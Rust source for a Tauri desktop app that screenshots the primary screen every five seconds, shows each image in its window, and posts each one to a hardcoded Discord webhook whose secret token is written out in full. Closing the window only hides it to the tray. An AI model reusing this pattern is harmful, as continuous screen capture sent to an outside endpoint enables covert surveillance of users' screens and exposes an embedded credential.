use base64::{engine::general_purpose, Engine as _};
use image::{
    codecs::png::PngEncoder, imageops::FilterType, ColorType, DynamicImage, ImageBuffer,
    ImageEncoder, Rgb, RgbImage, Rgba,
};

use reqwest::blocking::{multipart, Client};
use screenshots::Screen;
use serde::Serialize;
use tauri::{
    menu::{Menu, MenuItem},
    tray::{TrayIconBuilder, TrayIconEvent},
    Emitter, Manager, WindowEvent,
};

use chrono::Local;

#[tauri::command]
fn greet(name: &str) -> String {
    format!("Hello, {}! You've been greeted from Rust!", name)
}

#[derive(Debug, Clone, Serialize)]
pub struct Image {
    pub time: String,
    pub image: String,
}

#[tauri::command]
fn take_images(window: tauri::Window) {
    std::thread::spawn(move || {
        let screen = Screen::all().unwrap()[0];

        //let i = &tauri_plugin_screenshots::get_screenshotable_monitors()
        //    .await
        //    .unwrap()[0];
        //
        //let path = tauri_plugin_screenshots::get_monitor_screenshot(app_handle, i.id).await;

        loop {
            std::thread::sleep(std::time::Duration::from_secs(5));
            let time = Local::now().format("%-I:%M:%S %p");

            //let bytes = fs::read(image).unwrap();
            // capture raw BGRA pixels
            let capture = screen.capture().unwrap();
            let width = capture.width();
            let height = capture.height();
            let raw = capture.to_vec();

            let buffer: ImageBuffer<Rgba<u8>, Vec<u8>> =
                ImageBuffer::from_raw(width, height, raw).unwrap();

            let image = DynamicImage::ImageRgba8(buffer);
            let resized = image.resize(width / 2, height / 2, FilterType::Lanczos3);

            let mut png_bytes = Vec::new();
            let encoder = PngEncoder::new(&mut png_bytes);
            encoder
                .write_image(
                    &resized.to_rgba8(),
                    resized.width(),
                    resized.height(),
                    ColorType::Rgba8.into(),
                )
                .expect("failed to encode PNG");

            window
                .emit(
                    "images",
                    Image {
                        time: time.to_string(),
                        image: general_purpose::STANDARD.encode(&png_bytes),
                    },
                )
                .ok();

            std::thread::spawn(move || {
                let part = multipart::Part::bytes(png_bytes)
                    .file_name(format!("screenshot_{time}.png"))
                    .mime_str("image/png")
                    .unwrap();

                let form = multipart::Form::new()
                    .text("content", format!("Recap Screenshot on {time}"))
                    .part("file", part);

                let webhook_url = "https://discord.com/api/webhooks/1249379783410843699/bQaMBVHo2ECsqby3-i8wtP9DaPx30Lrj3T9GCi0Ief7j_y0BK789pBLBDvMYAB_Ktt1q";
                let client = Client::new();
                client.post(webhook_url).multipart(form).send().unwrap();
            });
        }
    });
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .setup(move |app| {
            let open_item = MenuItem::with_id(
                Menu::new(app).unwrap().app_handle(),
                "open",
                "Open App",
                true,
                None::<&str>,
            )
            .unwrap();
            let quit_item = MenuItem::with_id(
                Menu::new(app).unwrap().app_handle(),
                "quit",
                "Quit",
                true,
                None::<&str>,
            )
            .unwrap();
            let tray_menu = Menu::with_items(
                Menu::new(app).unwrap().app_handle(),
                &[&open_item, &quit_item],
            )
            .unwrap();

            let main_window = app.get_webview_window("main").unwrap();
            let main_window_2 = app.get_webview_window("main").unwrap();
            main_window.on_window_event(move |event| {
                if let WindowEvent::CloseRequested { api, .. } = event {
                    api.prevent_close();
                    main_window_2.hide().unwrap();
                }
            });

            // 2️⃣ Build the tray icon with menu and event handlers
            TrayIconBuilder::new()
                .icon(app.default_window_icon().unwrap().clone()) // use your default icon
                .menu(&tray_menu) // attach our two-item menu
                .show_menu_on_left_click(false) // show menu only on right-click
                .on_menu_event(move |app, event| match event.id.as_ref() {
                    "open" => {
                        let w = app.get_webview_window("main").unwrap();
                        w.show().unwrap();
                        w.set_focus().unwrap();
                    }
                    "quit" => {
                        std::process::exit(0);
                    }
                    _ => {}
                }) // handle menu clicks
                .on_tray_icon_event(move |tray, event| match event {
                    TrayIconEvent::DoubleClick { .. } => {
                        let w = tray.app_handle().get_webview_window("main").unwrap();
                        w.show().unwrap();
                        w.set_focus().unwrap();
                    }
                    _ => {}
                })
                .build(app)?; // finalize tray setup

            Ok(())
        })
        .plugin(tauri_plugin_shell::init())
        .plugin(tauri_plugin_screenshots::init())
        .invoke_handler(tauri::generate_handler![greet, take_images])
        .build(tauri::generate_context!())
        .expect("error while running tauri application")
        .run(|_, event| match event {
            tauri::RunEvent::Exit => {
                println!("hey we exit");
            }
            tauri::RunEvent::ExitRequested { .. } => {}
            _ => {}
        });
}
